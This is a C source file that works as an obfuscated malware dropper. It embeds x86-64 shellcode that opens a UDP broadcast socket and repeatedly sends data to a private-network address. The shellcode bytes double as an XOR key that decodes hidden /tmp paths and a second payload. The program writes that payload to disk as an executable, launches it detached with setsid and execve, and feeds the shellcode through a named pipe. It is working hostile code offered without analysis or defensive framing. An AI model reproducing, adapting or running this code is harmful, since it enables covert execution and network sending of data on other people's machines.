#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "enc_payload.h"

// Copy from shellcode.bin
const char shellcode[] = { 0x48, 0x89, 0xE5, 0xB8, 0x29, 0x00, 0x00, 0x00, 0xBF, 0x02, 0x00, 0x00, 0x00, 0xBE, 0x02, 0x00, 0x00, 0x00, 0xBA, 0x11, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x89, 0x45, 0xF8, 0x48, 0x89, 0xC7, 0xB8, 0x36, 0x00, 0x00, 0x00, 0xBE, 0x01, 0x00, 0x00, 0x00, 0xBA, 0x06, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x55, 0xF0, 0xC7, 0x45, 0xF0, 0x01, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x0F, 0x05, 
                           0xC6, 0x45, 0xD0, 0x02, 0xC6, 0x45, 0xD1, 0x00, 0xC6, 0x45, 0xD2, 0x22, 0xC6, 0x45, 0xD3, 0xAD, 0xC6, 0x45, 0xD4, 0xC0, 0xC6, 0x45, 0xD5, 0xA8, 0xC6, 0x45, 0xD6, 0x82, 0xC6, 0x45, 0xD7, 0x01, 0xC6, 0x45, 0xD8, 0x00, 0xC6, 0x45, 0xD9, 0x00, 0xC6, 0x45, 0xDA, 0x00, 0xC6, 0x45, 0xDB, 0x00, 0xC6, 0x45, 0xDC, 0x00, 0xC6, 0x45, 0xDD, 0x00, 0xC6, 0x45, 0xDE, 0x00, 0xC6, 0x45, 0xDF, 0x00, 0x48, 0x31, 0xFF, 0x8B, 0x7D, 0xF8, 0x48, 0x8D, 0x74, 0x24, 0x18, 0xBA, 0x18, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0xD0, 0x41, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xB8, 0x2C, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xB8, 0xE6, 0x00, 0x00, 0x00, 0xBF, 0x00, 0x00, 0x00, 0x00, 0xBE, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xE0, 0x48, 0xC7, 0x45, 0xE0, 0x03, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x45, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x41, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xE9, 0x69, 0xFF, 0xFF, 0xFF };

const int sclen = sizeof(shellcode);
const int sclen1 = 65;

void str_defuser(char *str, int len, char *payload, int payload_len)
{
    char c;
    int i = 0;
    int cc = 0;

    while (cc < len) {
        *str ^= (payload[i % payload_len]);
        i += 1;
        *str ^= (payload[i % payload_len]);
        i += 1;
        *str ^= (payload[i % payload_len]);
        i += 1;
        *str ^= (payload[i % payload_len]);
        i += 1;
        str += 1;
        cc += 1;
    }
}

int main(void)
{
    int	writefd;
    int ggfd;
    pid_t pid;
    char path[] = {-77, 93, -48, -52, -124, 109, 95, -50, 93, -38, -54, -78, 66, -102, -101, 127, 74, -94, 0};
    int path_len = sizeof(path) - 1;
    char path2[] = {-77, 93, -48, -52, -124, 109, 95, -50, 93, -38, -54, -78, 66, -102, -101, 127, 74, -94, -110, -35, -51, 34, -85, -111, -8, -52, -40, 37, -99, -38, -120, 115, 0};
    int path2_len = sizeof(path2) - 1;
    char reader[] = {-77, 93, -48, -52, -124, 100, 89, -47, 82, -52, -47, -92, 72, -106, -104, 98, 70, -2, -40, 0};
    int reader_len = sizeof(reader) - 1;

    str_defuser(path, path_len, shellcode, 65); // "/tmp/bnpkevsekfpk3"
    str_defuser(path2, path2_len, shellcode, 65); // "/tmp/bnpkevsekfpk3/aw3movsdirnqw"
    str_defuser(reader, reader_len, shellcode, 65); // "/tmp/khodsmeogemgoe"
    str_defuser(payload_hw1r, payload_hw1r_len, shellcode, 65); // shellcode: udp broadcast flag

    if ((ggfd = open(reader, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU | S_IRGRP | S_IROTH)) < 0) {
        perror("28: open()");
        exit(1);
    }

    if ((write(ggfd, payload_hw1r, payload_hw1r_len)) < 0) {
        perror("33: write()");
        exit(1);
    }

    close(ggfd);

    if ((pid = fork()) > 0) {
        struct stat st = {0};

        if (stat(path, &st) == -1) {
            mkdir(path, 0700);
        }

        if ((mkfifo(path2, 0600) < 0) && (errno != EEXIST)) {
            exit(1);
        }
    
        if ((writefd = open(path2, O_WRONLY)) < 0) {
            perror("open()");
            exit(1);
        }

        if ((write(writefd, shellcode, sclen)) < 0) {
            perror("write()");
            exit(1);
        }

        close(writefd);
    } else if (pid == 0) {
        setsid();
        char *pargv[] = {reader, 0};
        execve(pargv[0], pargv, 0);
        exit(0);
    } else {
        printf("Bye\n");
        exit(0);
    }
}
